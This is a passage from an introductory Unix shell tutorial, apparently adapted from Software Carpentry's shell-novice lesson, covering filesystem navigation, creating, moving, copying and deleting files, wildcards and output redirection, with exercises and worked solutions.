lessons or from other sources,\ndo not type the prompt, only the commands that follow it.\nType the command whoami,\nthen press the Enter key (sometimes marked Return) to send the command to the shell.\nThe command's output is the ID of the current user,\ni.e.,\nit shows us who the shell thinks we are:\n$ whoami\n\nnelle\n\nMore specifically, when we type whoami the shell:\n\nfinds a program called whoami,\nruns that program,\ndisplays that program's output, then\ndisplays a new prompt to tell us that it's ready for more commands.\n\n Username VariationIn this lesson, we have used the username nelle (associated\nwith our hypothetical scientist Nelle) in example input and output throughout.\nHowever, when\nyou type this lesson's commands on your computer,\nyou should see and use something different,\nnamely, the username associated with the user account on your computer.  This\nusername will be the output from whoami.  In\nwhat follows, nelle should always be replaced by that username.\n\n Unknown commandsRemember, the Shell is a program that runs other programs rather than doing\ncalculations itself. So the commands you type must be the names of existing\nprograms.\nIf you type the name of a program that does not exist and hit enter, you\nwill see an error message similar to this:\n$ mycommand\n\n-bash: mycommand: command not found\n\nThe Shell (Bash) tells you that it cannot find the program mycommand\nbecause the program you are trying to run does not exist on your computer.\nWe will touch on quite a few commands in the course of this tutorial, but there\nare actually many more than we can cover here.\n\nNext,\nlet's find out where we are by running a command called pwd\n(which stands for \"print working directory\").\nAt any moment,\nour current working directory\nis our current default directory,\ni.e.,\nthe directory that the computer assumes we want to run commands in\nunless we explicitly specify something else.\nHere,\nthe computer's response is /Users/nelle,\nwhich is Nelle's home directory:\n$ pwd\n\n/Users/nelle\n\n Home Directory VariationThe home directory path will look different on different operating systems.\nOn Linux it may look like /home/nelle,\nand on Windows it will be similar to C:\\Documents and Settings\\nelle or\nC:\\Users\\nelle.\n(Note that it may look slightly different for different versions of Windows.)\nOn lxplus your home directory is placed on a filesystem which can be shared\nbetween multiple computers called AFS.\nIf your CERN username is cernuser then your home directory will be:\n/afs/cern.ch/user/c/cernuser/\nIn future examples, we've used Mac output as the default - Linux and Windows\noutput may differ slightly, but should be generally similar.\n\nTo understand what a \"home directory\" is,\nlet's have a look at how the file system as a whole is organized.  For the\nsake of this example, we'll be\nillustrating the filesystem on our scientist Nelle's computer.  After this\nillustration, you'll be learning commands to explore your own filesystem,\nwhich will be constructed in a similar way, but not be exactly identical.\nOn Nelle's computer, the filesystem looks like this:\n\nAt the top is the root directory\nthat holds everything else.\nWe refer to it using a slash character / on its own;\nthis is the leading slash in /Users/nelle.\nInside that directory are several other directories:\nbin (which is where some built-in programs are stored),\ndata (for miscellaneous data files),\nUsers (where users' personal directories are located),\ntmp (for temporary files that don't need to be stored long-term),\nand so on.\nWe know that our current working directory /Users/nelle is stored inside /Users\nbecause /Users is the first part of its name.\nSimilarly,\nwe know that /Users is stored inside the root directory /\nbecause its name begins with /.\n SlashesNotice that there are two meanings for the / character.\nWhen it appears at the front of a file or directory name,\nit refers to the root directory. When it appears inside a name,\nit's just a separator.\n\nUnderneath /Users,\nwe find one directory for each user with an account on Nelle's machine,\nher colleagues the Mummy and Wolfman.\n\nThe Mummy's files are stored in /Users/imhotep,\nWolfman's in /Users/larry,\nand Nelle's in /Users/nelle.  Because Nelle is the user in our\nexamples here, this is why we get /Users/nelle as our home directory.\nTypically, when you open a new command prompt you will be in\nyour home directory to start.\nNow let's learn the command that will let us see the contents of our\nown filesystem.  We can see what's in our home directory by running ls,\nwhich stands for \"listing\":\n$ ls\n\nApplications Documents    Library      Music        Public\nDesktop      Downloads    Movies       Pictures\n\n(Again, your results may be slightly different depending on your operating\nsystem and how you have customized your filesystem.)\nls prints the names of the files and directories in the current directory in\nalphabetical order,\narranged neatly into columns.\nWe can make its output more comprehensible by using the flag -F\n(also known as a switch or an option) ,\nwhich tells ls to add a trailing / to the names of directories:\n$ ls -F\n\nApplications/ Documents/    Library/      Music/        Public/\nDesktop/      Downloads/    Movies/       Pictures/\n\nls has lots of other flags. To find out what they are, we can type:\n$ ls --help\n\nUsage: ls [OPTION]...

Doing a web search for\nunix man page COMMAND (e.g. unix man page grep)\nprovides links to numerous copies of the Unix manual\npages online.\nFor example, GNU provides links to its\nmanuals:\nthese include grep,\nand the\ncore GNU utilities,\nwhich covers many commands introduced within this lesson.\n\nTo navigate through the man pages,\nyou may use the up and down arrow keys to move line-by-line,\nor try the \"b\" and spacebar keys to skip up and down by a full page.\nQuit the man pages by typing \"q\".\nHere,\nwe can see that our home directory contains mostly sub-directories.\nAny names in your output that don't have trailing slashes,\nare plain old files.\nAnd note that there is a space between ls and -F:\nwithout it,\nthe shell thinks we're trying to run a command called ls-F,\nwhich doesn't exist.\n Parameters vs. ArgumentsAccording to Wikipedia#Parameters_and_arguments),\nthe terms argument and parameter\nmean slightly different things.\nIn practice,\nhowever,\nmost people use them interchangeably\nto refer to the input term(s) given to a command.\nConsider the example below:\nls -lh Documents\n\nls is the command, -lh are the flags (also called options),\nand Documents is the argument.\n\nWe can also use ls to see the contents of a different directory.  Let's take a\nlook at our Desktop directory by running ls -F Desktop,\ni.e.,\nthe command ls with the -F flag and the argument  Desktop.\nThe argument Desktop tells ls that\nwe want a listing of something other than our current working directory:\n$ ls -F Desktop\n\ndata-shell/\n\nYour output should be a list of all the files and sub-directories on your\nDesktop, including the data-shell directory you downloaded at\nthe start of the lesson.  Take a look at your Desktop to confirm that\nyour output is accurate.\nAs you may now see, using a bash shell is strongly dependent on the idea that\nyour files are organized in a hierarchical file system.\nOrganizing things hierarchically in this way helps us keep track of our work:\nit's possible to put hundreds of files in our home directory,\njust as it's possible to pile hundreds of printed papers on our desk,\nbut it's a self-defeating strategy.\nNow that we know the data-shell directory is located on our Desktop, we\ncan do two things.\nFirst, we can look at its contents, using the same strategy as before, passing\na directory name to ls:\n$ ls -F Desktop/data-shell\n\ncreatures/          molecules/          notes.txt           solar.pdf\ndata/               north-pacific-gyre/ pizza.cfg           writing/\n\nSecond, we can actually change our location to a different directory, so\nwe are no longer located in\nour home directory.\nThe command to change locations is cd followed by a\ndirectory name to change our working directory.\ncd stands for \"change directory\",\nwhich is a bit misleading:\nthe command doesn't change the directory,\nit changes the shell's idea of what directory we are in.\nLet's say we want to move to the data directory we saw above.  We can\nuse the following series of commands to get there:\n$ cd Desktop\n$ cd data-shell\n$ cd data\n\nThese commands will move us from our home directory onto our Desktop, then into\nthe data-shell directory, then into the data directory.  cd doesn't print anything,\nbut if we run pwd after it, we can see that we are now\nin /Users/nelle/Desktop/data-shell/data.\nIf we run ls without arguments now,\nit lists the contents of /Users/nelle/Desktop/data-shell/data,\nbecause that's where we now are:\n$ pwd\n\n/Users/nelle/Desktop/data-shell/data\n\n$ ls -F\n\namino-acids.txt   elements/     pdb/            salmon.txt\nanimals.txt       morse.txt     planets.txt     sunspot.txt\n\nWe now know how to go down the directory tree, but\nhow do we go up?  We might try the following:\n$ cd data-shell\n\n-bash: cd: data-shell: No such file or directory\n\nBut we get an error!  Why is this?\nWith our methods so far,\ncd can only see sub-directories inside your current directory.  There are\ndifferent ways to see directories above your current location; we'll start\nwith the simplest.\nThere is a shortcut in the shell to move up one directory level\nthat looks like this:\n$ cd ..\n\n.. is a special directory name meaning\n\"the directory containing this one\",\nor more succinctly,\nthe parent of the current directory.\nSure enough,\nif we run pwd after running cd .., we're back in /Users/nelle/Desktop/data-shell:\n$ pwd\n\n/Users/nelle/Desktop/data-shell\n\nThe special directory .. doesn't usually show up when we run ls.  If we want\nto display it, we can give ls the -a flag:\n$ ls -F -a\n\n./                  creatures/          notes.txt\n../                 data/               pizza.cfg\n.bash_profile       molecules/          solar.pdf\nDesktop/            north-pacific-gyre/ writing/\n\n-a stands for \"show all\";\nit forces ls to show us file and directory names that begin with .,\nsuch as .. (which, if we're in /Users/nelle, refers to the /Users directory)\nAs you can see,\nit also displays another special directory that's just called .,\nwhich means \"the current working directory\".\nIt may seem redundant to have a name for it,\nbut we'll see some uses for it soon.\nNote that in most command line tools, multiple arguments can be combined\nwith a single - and no spaces between the arguments: ls -F -a is\nequivalent to ls -Fa.\n Other Hidden FilesIn addition to the hidden directories .. and ., you may also see a file\ncalled .bash_profile. This file usually contains shell configuration\nsettings. You may also see other files and directories beginning\nwith .. These are usually files and directories that are used to configure\ndifferent programs on your computer. The prefix . is used to prevent these\nconfiguration files from cluttering the terminal when a standard ls command\nis used.\n\n OrthogonalityThe special names . and .. don't belong to cd;\nthey are interpreted the same way by every program.\nFor example,\nif we are in /Users/nelle/data,\nthe command ls .. will give us a listing of /Users/nelle.\nWhen the meanings of the parts are the same no matter how they're combined,\nprogrammers say they are orthogonal:\nOrthogonal systems tend to be easier for people to learn\nbecause there are fewer special cases and exceptions to keep track of.\n\nThese then, are the basic commands for navigating the filesystem on your computer:\npwd, ls and cd.  Let's explore some variations on those commands.  What happens\nif you type cd on its own, without giving\na directory?\n$ cd\n\nHow can you check what happened?  pwd gives us the answer!\n$ pwd\n\n/Users/nelle\n\nIt turns out that cd without an argument will return you to your home directory,\nwhich is great if you've gotten lost in your own filesystem.\nLet's try returning to the data directory from before.  Last time, we used\nthree commands, but we can actually string together the list of directories\nto move to data in one step:\n$ cd Desktop/data-shell/data\n\nCheck that we've moved to the right place by running pwd and ls -F\nIf we want to move up one level from the data directory, we could use cd ...  But\nthere is another way to move to any directory, regardless of your\ncurrent location.\nSo far, when specifying directory names, or even a directory path (as above),\nwe have been using relative paths.  When you use a relative path with a command\nlike ls or cd, it tries to find that location  from where we are,\nrather than from the root of the file system.\nHowever, it is possible to specify the absolute path to a directory by\nincluding its entire path from the root directory, which is indicated by a\nleading slash.  The leading / tells the computer to follow the path from\nthe root of the file system, so it always refers to exactly one directory,\nno matter where we are when we run the command.\nThis allows us to move to our data-shell directory from anywhere on\nthe filesystem (including from inside data).  To find the absolute path\nwe're looking for, we can use pwd and then extract the piece we need\nto move to data-shell.\n$ pwd\n\n/Users/nelle/Desktop/data-shell/data\n\n$ cd /Users/nelle/Desktop/data-shell\n\nRun pwd and ls -F to ensure that we're in the directory we expect.\n Two More ShortcutsThe shell interprets the character ~ (tilde) at the start of a path to\nmean \"the current user's home directory\". For example, if Nelle's home\ndirectory is /Users/nelle, then ~/data is equivalent to\n/Users/nelle/data. This only works if it is the first character in the\npath: here/there/~/elsewhere is not here/there/Users/nelle/elsewhere.\nAnother shortcut is the - (dash) character.  cd will translate - into\nthe previous directory I was in, which is faster than having to remember,\nthen type, the full path.  This is a very efficient way of moving back\nand forth between directories. The difference between cd .. and cd - is\nthat the former brings you up, while the latter brings you back. You can\nthink of it as the Last Channel button on a TV remote.\n\nNelle's Pipeline: Organizing Files\nKnowing just this much about files and directories,\nNelle is ready to organize the files that the protein assay machine will create.\nFirst,\nshe creates a directory called north-pacific-gyre\n(to remind herself where the data came from).\nInside that,\nshe creates a directory called 2012-07-03,\nwhich is the date she started processing the samples.\nShe used to use names like conference-paper and revised-results,\nbut she found them hard to understand after a couple of years.\n(The final straw was when she found herself creating\na directory called revised-revised-results-3.)\n Sorting OutputNelle names her directories \"year-month-day\",\nwith leading zeroes for months and days,\nbecause the shell displays file and directory names in alphabetical order.\nIf she used month names,\nDecember would come before July;\nif she didn't use leading zeroes,\nNovember ('11') would come before July ('7'). Similarly, putting the year first\nmeans that June 2012 will come before June 2013.\n\nEach of her physical samples is labelled according to her lab's convention\nwith a unique ten-character ID,\nsuch as \"NENE01729A\".\nThis is what she used in her collection log\nto record the location, time, depth, and other characteristics of the sample,\nso she decides to use it as part of each data file's name.\nSince the assay machine's output is plain text,\nshe will call her files NENE01729A.txt, NENE01812A.txt, and so on.\nAll 1520 files will go into the same directory.\nNow in her current directory data-shell,\nNelle can see what files she has using the command:\n$ ls north-pacific-gyre/2012-07-03/\n\nThis is a lot to type,\nbut she can let the shell do most of the work through what is called tab completion.\nIf she types:\n$ ls nor\n\nand then presses tab (the tab key on her keyboard),\nthe shell automatically completes the directory name for her:\n$ ls north-pacific-gyre/\n\nIf she presses tab again,\nBash will add 2012-07-03/ to the command,\nsince it's the only possible completion.\nPressing tab again does nothing,\nsince there are 19 possibilities;\npressing tab twice brings up a list of all the files,\nand so on.\nThis is called tab completion,\nand we will see it in many other tools as we go on.\n Absolute vs Relative PathsStarting from /Users/amanda/data/,\nwhich of the following commands could Amanda use to navigate to her home directory,\nwhich is /Users/amanda?\n\ncd .\ncd /\ncd /home/amanda\ncd ../..\ncd ~\ncd home\ncd ~/data/..\ncd\ncd ..\n\n SolutionClick to expand\nNo: . stands for the current directory.\nNo: / stands for the root directory.\nNo: Amanda's home directory is /Users/amanda.\nNo: this goes up two levels, i.e. ends in /Users.\nYes: ~ stands for the user's home directory, in this case /Users/amanda.\nNo: this would navigate into a directory home in the current directory if it exists.\nYes: unnecessarily complicated, but correct.\nYes: shortcut to go back to the user's home directory.\nYes: goes up one level.\n\n\n Relative Path ResolutionUsing the filesystem diagram below, if pwd displays /Users/thing,\nwhat will ls -F ../backup display?\n\n../backup: No such file or directory\n2012-12-01 2013-01-08 2013-01-27\n2012-12-01/ 2013-01-08/ 2013-01-27/\noriginal/ pnas_final/ pnas_sub/\n\n\n SolutionClick to expand\nNo: there is a directory backup in /Users.\nNo: this is the content of Users/thing/backup,\nbut with .. we asked for one level further up.\nNo: see previous explanation.\nYes: ../backup/ refers to /Users/backup/.\n\n\n `ls` Reading ComprehensionAssuming a directory structure as in the above Figure\n(File System for Challenge Questions), if pwd displays /Users/backup,\nand -r tells ls to display things in reverse order,\nwhat command will display:\npnas_sub/ pnas_final/ original/\n\n\nls pwd\nls -r -F\nls -r -F /Users/backup\nEither #2 or #3 above, but not #1.\n\n SolutionClick to expand\nNo: pwd is not the name of a directory.\nYes: ls without directory argument lists files and directories\nin the current directory.\nYes: uses the absolute path explicitly.\nCorrect: see explanations above.\n\n\n Exploring More `ls` FlagsWhat does the command ls do when used with the -l and -h flags?\nSome of its output is about properties that we do not cover in this lesson (such\nas file permissions and ownership), but the rest should be useful\nnevertheless.\n SolutionClick to expandThe -l flag makes ls use a long listing format, showing not only\nthe file/directory names but also additional information such as the file size\nand the time of its last modification. The -h flag makes the file size\n\"human readable\", i.e. display something like 5.3K instead of 5369.\n\n Listing Recursively and By TimeThe command ls -R lists the contents of directories recursively, i.e., lists\ntheir sub-directories, sub-sub-directories, and so on in alphabetical order\nat each level. The command ls -t lists things by time of last change, with\nmost recently changed files or directories first.\nIn what order does ls -R -t display things? Hint: ls -l uses a long listing\nformat to view timestamps.\n SolutionClick to expandThe directories are listed alphabetical at each level, the files/directories\nin each directory are sorted by time of last change.\n\n Key Points\nThe file system is responsible for managing information on the disk.\nInformation is stored in files, which are stored in directories (folders).\nDirectories can also store other directories, which forms a directory tree.\ncd path changes the current working directory.\nls path prints a listing of a specific file or directory; ls on its own lists the current working directory.\npwd prints the user's current working directory.\nwhoami shows the user's current identity.\n/ on its own is the root directory of the whole file system.\nA relative path specifies a location starting from the current location.\nAn absolute path specifies a location from the root of the file system.\nDirectory names in a path are separated with / on Unix, but \\\\\\\\ on Windows.\n.. means 'the directory above the current one'; . on its own means 'the current directory'.\nMost files' names are something.extension. The extension isn't required, and doesn't guarantee anything, but is normally used to indicate the type of data in the file.\nMost commands take options (flags) which begin with a -.\n\n\nCC BY 4.0 - Based on shell-novice © 2016–2017 Software Carpentry Foundation\n"},"shell/03-create.html":{"url":"shell/03-create.html","title":"Working With Files and Directories","keywords":"","body":"Working With Files and Directories\n Learning Objectives\nCreate a directory hierarchy that matches a given diagram.\nCreate files in that hierarchy using an editor or by copying and renaming existing files.\nDisplay the contents of a directory using the command line.\nDelete specified files and/or directories.\nThe shell does not have a trash bin: once something is deleted, it's really gone.\nDepending on the type of work you do, you may need a more powerful text editor than Nano.\n\n\nWe now know how to explore files and directories,\nbut how do we create them in the first place?\nLet's go back to our data-shell directory on the Desktop\nand use ls -F to see what it contains:\n$ pwd\n\n/Users/nelle/Desktop/data-shell\n\n$ ls -F\n\ncreatures/  molecules/           pizza.cfg\ndata/       north-pacific-gyre/  solar.pdf\nDesktop/    notes.txt            writing/\n\nLet's create a new directory called thesis using the command mkdir thesis\n(which has no output):\n$ mkdir thesis\n\nAs you might guess from its name,\nmkdir means \"make directory\".\nSince thesis is a relative path\n(i.e., doesn't have a leading slash),\nthe new directory is created in the current working directory:\n$ ls -F\n\ncreatures/  north-pacific-gyre/  thesis/\ndata/       notes.txt            writing/\nDesktop/    pizza.cfg\nmolecules/  solar.pdf\n\n Two ways of doing the same thingUsing the shell to create a directory is no different than using a file explorer.\nIf you open the current directory using your operating system's graphical file explorer,\nthe thesis directory will appear there too.\nWhile they are two different ways of interacting with the files,\nthe files and directories themselves are the same.\n\n Good names for files and directoriesComplicated names of files and directories can make your life painful\nwhen working on the command line. Here we provide a few useful\ntips for the names of your files.\n\nDon't use whitespaces.\nWhitespaces can make a name more meaningful\nbut since whitespace is used to break arguments on the command line\nis better to avoid them in names of files and directories.\nYou can use - or _ instead of whitespace.\n\nDon't begin the name with - (dash).\nCommands treat names starting with - as options.\n\nStick with letters, numbers, . (period), - (dash) and _ (underscore).\nMany other characters have special meanings on the command line.\nWe will learn about some of these during this lesson.\nThere are special characters that can cause your command to not work as\nexpected and can even result in data loss.\n\n\nIf you need to refer to names of files or directories that have whitespace\nor another non-alphanumeric character, you should surround the name in quotes (\"\").\n\nSince we've just created the thesis directory, there's nothing in it yet:\n$ ls -F thesis\n\nLet's change our working directory to thesis using cd,\nthen run a text editor called Nano to create a file called draft.txt:\n$ cd thesis\n$ nano draft.txt\n\n Which Editor?When we say, \"nano is a text editor,\" we really do mean \"text\": it can\nonly work with plain character data, not tables, images, or any other\nhuman-friendly media. We use it in examples because it is one of the\nleast complex text editors. However, because of this trait, it may\nnot be powerful enough or flexible enough for the work you need to do\nafter this workshop. On Unix systems (such as Linux and Mac OS X),\nmany programmers use Emacs or\nVim (both of which require more time to learn),\nor a graphical editor such as\nGedit. On Windows, you may wish to\nuse Notepad++.  Windows also has a built-in\neditor called notepad that can be run from the command line in the same\nway as nano for the purposes of this lesson.\nNo matter what editor you use, you will need to know where it searches\nfor and saves files. If you start it from the shell, it will (probably)\nuse your current working directory as its default location. If you use\nyour computer's start menu, it may want to save files in your desktop or\ndocuments directory instead. You can change this by navigating to\nanother directory the first time you \"Save As...\"\n\nLet's type in a few lines of text.\nOnce we're happy with our text, we can press Ctrl-O (press the Ctrl or Control key and, while\nholding it down, press the O key) to write our data to disk\n(we'll be asked what file we want to save this to:\npress Return to accept the suggested default of draft.txt).\n\nOnce our file is saved, we can use Ctrl-X to quit the editor and\nreturn to the shell.\n Control, Ctrl, or ^ KeyThe Control key is also called the \"Ctrl\" key. There are various ways\nin which using the Control key may be described. For example, you may\nsee an instruction to press the Control key and, while holding it down,\npress the X key, described as any of:\n\nControl-X\nControl+X\nCtrl-X\nCtrl+X\n^X\nC-x\n\nIn nano, along the bottom of the screen you'll see ^G Get Help ^O WriteOut.\nThis means that you can use Control-G to get help and Control-O to save your\nfile.\n\nnano doesn't leave any output on the screen after it exits,\nbut ls now shows that we have created a file called draft.txt:\n$ ls\n\ndraft.txt\n\nLet's tidy up by running rm draft.txt:\n$ rm draft.txt\n\nThis command removes files (rm is short for \"remove\").\nIf we run ls again,\nits output is empty once more,\nwhich tells us that our file is gone:\n$ ls\n\n Deleting Is ForeverThe Unix shell doesn't have a trash bin that we can recover deleted\nfiles from (though most graphical interfaces to Unix do).  Instead,\nwhen we delete files, they are unhooked from the file system so that\ntheir storage space on disk can be recycled. Tools for finding and\nrecovering deleted files do exist, but there's no guarantee they'll\nwork in any particular situation, since the computer may recycle the\nfile's disk space right away.\n\nLet's re-create that file\nand then move up one directory to /Users/nelle/Desktop/data-shell using cd ..:\n$ pwd\n\n/Users/nelle/Desktop/data-shell/thesis\n\n$ nano draft.txt\n$ ls\n\ndraft.txt\n\n$ cd ..\n\nIf we try to remove the entire thesis directory using rm thesis,\nwe get an error message:\n$ rm thesis\n\nrm: cannot remove `thesis': Is a directory\n\nThis happens because rm by default only works on files, not directories.\nTo really get rid of thesis we must also delete the file draft.txt.\nWe can do this with the recursive option for rm:\n$ rm -r thesis\n\n With Great Power Comes Great ResponsibilityRemoving the files in a directory recursively can be very dangerous\noperation. If we're concerned about what we might be deleting we can\nadd the \"interactive\" flag -i to rm which will ask us for confirmation\nbefore each step\n$ rm -r -i thesis\nrm: descend into directory ‘thesis’? y\nrm: remove regular file ‘thesis/draft.txt’? y\nrm: remove directory ‘thesis’? y\n\nThis removes everything in the directory, then the directory itself, asking\nat each step for you to confirm the deletion.\n\nLet's create that directory and file one more time.\n(Note that this time we're running nano with the path thesis/draft.txt,\nrather than going into the thesis directory and running nano on draft.txt there.)\n$ pwd\n\n/Users/nelle/Desktop/data-shell\n\n$ mkdir thesis\n$ nano thesis/draft.txt\n$ ls thesis\n\ndraft.txt\n\ndraft.txt isn't a particularly informative name,\nso let's change the file's name using mv,\nwhich is short for \"move\":\n$ mv thesis/draft.txt thesis/quotes.txt\n\nThe first argument tells mv what we're \"moving\",\nwhile the second is where it's to go.\nIn this case,\nwe're moving thesis/draft.txt to thesis/quotes.txt,\nwhich has the same effect as renaming the file.\nSure enough,\nls shows us that thesis now contains one file called quotes.txt:\n$ ls thesis\n\nquotes.txt\n\nOne has to be careful when specifying the target file name, since mv will\nsilently overwrite any existing file with the same name, which could\nlead to data loss. An additional flag, mv -i (or mv --interactive),\ncan be used to make mv ask you for confirmation before overwriting.\nJust for the sake of consistency,\nmv also works on directories\nLet's move quotes.txt into the current working directory.\nWe use mv once again,\nbut this time we'll just use the name of a directory as the second argument\nto tell mv that we want to keep the filename,\nbut put the file somewhere new.\n(This is why the command is called \"move\".)\nIn this case,\nthe directory name we use is the special directory name . that we mentioned earlier.\n$ mv thesis/quotes.txt .\n\nThe effect is to move the file from the directory it was in to the current working directory.\nls now shows us that thesis is empty:\n$ ls thesis\n\nFurther,\nls with a filename or directory name as an argument only lists that file or directory.\nWe can use this to see that quotes.txt is still in our current directory:\n$ ls quotes.txt\n\nquotes.txt\n\nThe cp command works very much like mv,\nexcept it copies a file instead of moving it.\nWe can check that it did the right thing using ls\nwith two paths as arguments --- like most Unix commands,\nls can be given multiple paths at once:\n$ cp quotes.txt thesis/quotations.txt\n$ ls quotes.txt thesis/quotations.txt\n\nquotes.txt   thesis/quotations.txt\n\nTo prove that we made a copy,\nlet's delete the quotes.txt file in the current directory\nand then run that same ls again.\n$ rm quotes.txt\n$ ls quotes.txt thesis/quotations.txt\n\nls: cannot access quotes.txt: No such file or directory\nthesis/quotations.txt\n\nThis time it tells us that it can't find quotes.txt in the current directory,\nbut it does find the copy in thesis that we didn't delete.\n What's In A Name?You may have noticed that all of Nelle's files' names are \"something dot\nsomething\", and in this part of the lesson, we always used the extension\n.txt.  This is just a convention: we can call a file mythesis or\nalmost anything else we want. However, most people use two-part names\nmost of the time to help them (and their programs) tell different kinds\nof files apart. The second part of such a name is called the\nfilename extension, and indicates\nwhat type of data the file holds: .txt signals a plain text file, .pdf\nindicates a PDF document, .cfg is a configuration file full of parameters\nfor some program or other, .png is a PNG image, and so on.\nThis is just a convention, albeit an important one. Files contain\nbytes: it's up to us and our programs to interpret those bytes\naccording to the rules for plain text files, PDF documents, configuration\nfiles, images, and so on.\nNaming a PNG image of a whale as whale.mp3 doesn't somehow\nmagically turn it into a recording of whalesong, though it might\ncause the operating system to try to open it with a music player\nwhen someone double-clicks it.\n\n Renaming FilesSuppose that you created a .txt file in your current directory to contain a list of the\nstatistical tests you will need to do to analyze your data, and named it: statstics.txt\nAfter creating and saving this file you realize you misspelled the filename! You want to\ncorrect the mistake, which of the following commands could you use to do so?\n\ncp statstics.txt statistics.txt\nmv statstics.txt statistics.txt\nmv statstics.txt .\ncp statstics.txt .\n\n SolutionClick to expand\nNo.  While this would create a file with the correct name, the incorrectly named file still exists in the directory\nand would need to be deleted.\nYes, this would work to rename the file.\nNo, the period(.) indicates where to move the file, but does not provide a new file name; identical file names\ncannot be created.\nNo, the period(.) indicates where to copy the file, but does not provide a new file name; identical file names\ncannot be created.\n\n\n Moving and CopyingWhat is the output of the closing ls command in the sequence shown below?\n$ pwd\n\n/Users/jamie/data\n\n$ ls\n\nproteins.dat\n\n$ mkdir recombine\n$ mv proteins.dat recombine\n$ cp recombine/proteins.dat ../proteins-saved.dat\n$ ls\n\n\nproteins-saved.dat recombine\nrecombine\nproteins.dat recombine\nproteins-saved.dat\n\n SolutionClick to expandWe start in the /Users/jamie/data directory, and create a new folder called recombine.\nThe second line moves (mv) the file proteins.dat to the new folder (recombine).\nThe third line makes a copy of the file we just moved.  The tricky part here is where the file was\ncopied to.  Recall that .. means \"go up a level\", so the copied file is now in /Users/jamie.\nNotice that .. is interpreted with respect to the current working\ndirectory, not with respect to the location of the file being copied.\nSo, the only thing that will show using ls (in /Users/jamie/data) is the recombine folder.\n\nNo, see explanation above.  proteins-saved.dat is located at /Users/jamie\nYes\nNo, see explanation above.  proteins.dat is located at /Users/jamie/data/recombine\nNo, see explanation above.  proteins-saved.dat is located at /Users/jamie\n\n\n Organizing Directories and FilesJamie is working on a project and she sees that her files aren't very well\norganized:\n$ ls -F\n\nanalyzed/  fructose.dat    raw/   sucrose.dat\n\nThe fructose.dat and sucrose.dat files contain output from her data\nanalysis. What command(s) covered in this lesson does she need to run so that the commands below will\nproduce the output shown?\n$ ls -F\n\nanalyzed/   raw/\n\n$ ls analyzed\n\nfructose.dat    sucrose.dat\n\n SolutionClick to expandmv *.dat analyzed\n{: .bash}\nJamie needs to move her files fructose.dat and sucrose.dat to the analyzed directory.\nThe shell will expand *.dat to match all .dat files in the current directory.\nThe mv command then moves the list of .dat files to the \"analyzed\" directory.\n\n Copy with Multiple FilenamesFor this exercise, you can test the commands in the data-shell/data directory.\nIn the example below, what does cp do when given several filenames and a directory name?\n$ mkdir backup\n$ cp amino-acids.txt animals.txt backup/\n\nIn the example below, what does cp do when given three or more file names?\n$ ls -F\n\namino-acids.txt  animals.txt  backup/  elements/  morse.txt  pdb/  planets.txt  salmon.txt  sunspot.txt\n\n$ cp amino-acids.txt animals.txt morse.txt\n\n SolutionClick to expandIf given more than one file name followed by a directory name (i.e. the destination directory must\nbe the last argument), cp copies the files to the named directory.\nIf given three file names, cp throws an error because it is expecting a directory\nname as the last argument.\ncp: target ‘morse.txt’ is not a directory\n{: .output}\n\n Listing Recursively and By TimeThe command ls -R lists the contents of directories recursively,\ni.e., lists their sub-directories, sub-sub-directories, and so on\nin alphabetical order at each level.\nThe command ls -t lists things by time of last change,\nwith most recently changed files or directories first.\nIn what order does ls -R -t display things?\n SolutionClick to expandThe command ls -R -t displays the directories recursively in\nchronological order at each level, and the files in each directory\nare displayed chronologically.\n\n Creating Files a Different WayWe have seen how to create text files using the nano editor.\nNow, try the following command in your home directory:\n$ cd                  # go to your home directory\n$ touch my_file.txt\n\n\nWhat did the touch command do?\nWhen you look at your home directory using the GUI file explorer,\ndoes the file show up?\n\nUse ls -l to inspect the files.  How large is my_file.txt?\n\nWhen might you want to create a file this way?\n\n\n SolutionClick to expand\nThe touch command generates a new file called 'my_file.txt' in\nyour home directory.

It matches zero or more\ncharacters, so *.pdb matches ethane.pdb, propane.pdb, and every\nfile that ends with '.pdb'. On the other hand, p*.pdb only matches\npentane.pdb and propane.pdb, because the 'p' at the front only\nmatches filenames that begin with the letter 'p'.\n? is also a wildcard, but it only matches a single character. This\nmeans that p?.pdb would match pi.pdb or p5.pdb (if we had these two\nfiles in the molecules directory), but not propane.pdb.\nWe can use any number of wildcards at a time: for example, p*.p?*\nmatches anything that starts with a 'p' and ends with '.', 'p', and at\nleast one more character (since the ? has to match one character, and\nthe final * can match any number of characters). Thus, p*.p?* would\nmatch preferred.practice, and even p.pi (since the first * can\nmatch no characters at all), but not quality.practice (doesn't start\nwith 'p') or preferred.p (there isn't at least one character after the\n'.p').\nWhen the shell sees a wildcard, it expands the wildcard to create a\nlist of matching filenames before running the command that was\nasked for. As an exception, if a wildcard expression does not match\nany file, Bash will pass the expression as an argument to the command\nas it is. For example typing ls *.pdf in the molecules directory\n(which contains only files with names ending with .pdb) results in\nan error message that there is no file called *.pdf.\nHowever, generally commands like wc and ls see the lists of\nfile names matching these expressions, but not the wildcards\nthemselves. It is the shell, not the other programs, that deals with\nexpanding wildcards, and this is another example of orthogonal design.\n\n Using WildcardsWhen run in the molecules directory, which ls command(s) will\nproduce this output?\nethane.pdb   methane.pdb\n\nls *t*ane.pdb\nls *t?ne.*\nls *t??ne.pdb\nls ethane.*\n\n SolutionClick to expand\n\n The solution is 3.\n1. shows all files that contain any number and combination of characters, followed by the letter t, another single character, and end with ane.pdb. This includes octane.pdb and pentane.pdb.\n2. shows all files containing any number and combination of characters, t, another single character, ne. followed by any number and combination of characters. This will give us octane.pdb and pentane.pdb but doesn't match anything which ends in thane.pdb.\n3. fixes the problems of option 2 by matching two characters between t and ne. This is the solution.\n4. only shows files starting with ethane..\n\n\n\nIf we run wc -l instead of just wc,\nthe output shows only the number of lines per file:\n$ wc -l *.pdb\n\n  20  cubane.pdb\n  12  ethane.pdb\n   9  methane.pdb\n  30  octane.pdb\n  21  pentane.pdb\n  15  propane.pdb\n 107  total\n\nWe can also use -w to get only the number of words,\nor -c to get only the number of characters.\nWhich of these files is shortest?\nIt's an easy question to answer when there are only six files,\nbut what if there were 6000?\nOur first step toward a solution is to run the command:\n$ wc -l *.pdb > lengths.txt\n\nThe greater than symbol, >, tells the shell to redirect the command's output\nto a file instead of printing it to the screen. (This is why there is no screen output:\neverything that wc would have printed has gone into the\nfile lengths.txt instead.)  The shell will create\nthe file if it doesn't exist. If the file exists, it will be\nsilently overwritten, which may lead to data loss and thus requires\nsome caution.\nls lengths.txt confirms that the file exists:\n$ ls lengths.txt\n\nlengths.txt\n\nWe can now send the content of lengths.txt to the screen using cat lengths.txt.\ncat stands for \"concatenate\":\nit prints the contents of files one after another.\nThere's only one file in this 